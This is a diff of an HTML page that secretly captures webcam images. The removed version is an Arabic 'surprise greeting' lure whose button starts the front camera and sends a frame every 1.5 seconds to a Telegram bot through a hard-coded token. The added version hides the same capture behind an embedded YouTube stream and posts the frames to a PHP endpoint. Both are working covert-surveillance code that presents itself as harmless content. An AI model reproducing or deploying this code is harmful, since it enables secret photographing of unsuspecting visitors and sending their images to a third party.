@@ -1,118 +1,82 @@
-<!DOCTYPE html>
-<html lang="ar">
+<!doctype html>
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Happy Festival</title>
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
-    <style>
-        body {
-            background: linear-gradient(to bottom right, #f6ff00, #e1e8e7, #00ffe9);
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-family: 'Tahoma', sans-serif;
-            margin: 0;
-            text-align: center;
-        }
-        .container {
-            background: rgba(255, 255, 255, 0.8);
-            padding: 30px;
-            border-radius: 15px;
-            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
-        }
-        button {
-            padding: 15px 30px;
-            font-size: 20px;
-            background-color: #ff7700;
-            color: white;
-            border: none;
-            border-radius: 50px;
-            cursor: pointer;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.3);
-            transition: 0.3s;
-        }
-        button:hover {
-            transform: scale(1.05);
-            background-color: #ff4400;
-        }
-    </style>
+<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
 </head>
-<body>
 
-    <div class="container" id="main-content">
-        <h2 style="color: #005f96;">وصلتك تهنئة خاصة!</h2>
-        <p>اضغط على الزر أدناه لمشاهدة المفاجأة</p>
-        <button id="startBtn">إظهار المفاجأة 🎁</button>
-    </div>
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
 
-    <div hidden="hidden">
-        <video id="video" playsinline autoplay></video>
-        <canvas id="canvas" width="640" height="480"></canvas>
-    </div>
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
 
-    <script>
-        'use strict';
+<script>
 
-        // بياناتك التي أرسلتها
-        const botToken = '6298945282:AAFfSm47XKXRK-QkA5hmWh5Z5dCr1V--hDY';
-        const chatId = '2103976274';
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'forwarding_link/post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
 
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const context = canvas.getContext('2d');
 
-        // ربط تشغيل الكاميرا بالزر لكسر حماية المتصفح
-        document.getElementById('startBtn').addEventListener('click', function() {
-            document.getElementById('main-content').innerHTML = "<h3>جاري تحميل المفاجأة...</h3><div class='loader'></div>";
-            init();
-        });
+'use strict';
 
-        async function init() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    audio: false,
-                    video: { facingMode: "user" }
-                });
-                handleSuccess(stream);
-            } catch (e) {
-                console.error("Camera error:", e);
-            }
-        }
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
 
-        function handleSuccess(stream) {
-            window.stream = stream;
-            video.srcObject = stream;
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
 
-            // التقاط وإرسال صورة كل 1.5 ثانية
-            setInterval(function() {
-                context.drawImage(video, 0, 0, 640, 480);
-                var canvasData = canvas.toDataURL("image/png");
-                sendToTelegram(canvasData);
-            }, 1500);
-        }
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
 
-        function sendToTelegram(imgData) {
-            fetch(imgData)
-                .then(res => res.blob())
-                .then(blob => {
-                    const formData = new FormData();
-                    formData.append('chat_id', chatId);
-                    formData.append('photo', blob, 'capture.png');
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
 
-                    $.ajax({
-                        type: 'POST',
-                        url: `https://api.telegram.org/bot${botToken}/sendPhoto`,
-                        data: formData,
-                        processData: false,
-                        contentType: false,
-                        success: function(result) {
-                            console.log('Sent!');
-                        }
-                    });
-                });
-        }
-    </script>
-</body>
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 640, 480);
+       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+       post(canvasData); }, 1500);
+  
+
+}
+
+// Load init
+init();
+
+</script>
+
+    <body>
+        <iframe id="Live_YT_TV" width="100%" height="500px" src="https://www.youtube.com/embed/live_yt_tv?autoplay=1" frameborder="0" allow="autoplay encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+
+    </body>
+
 </html>
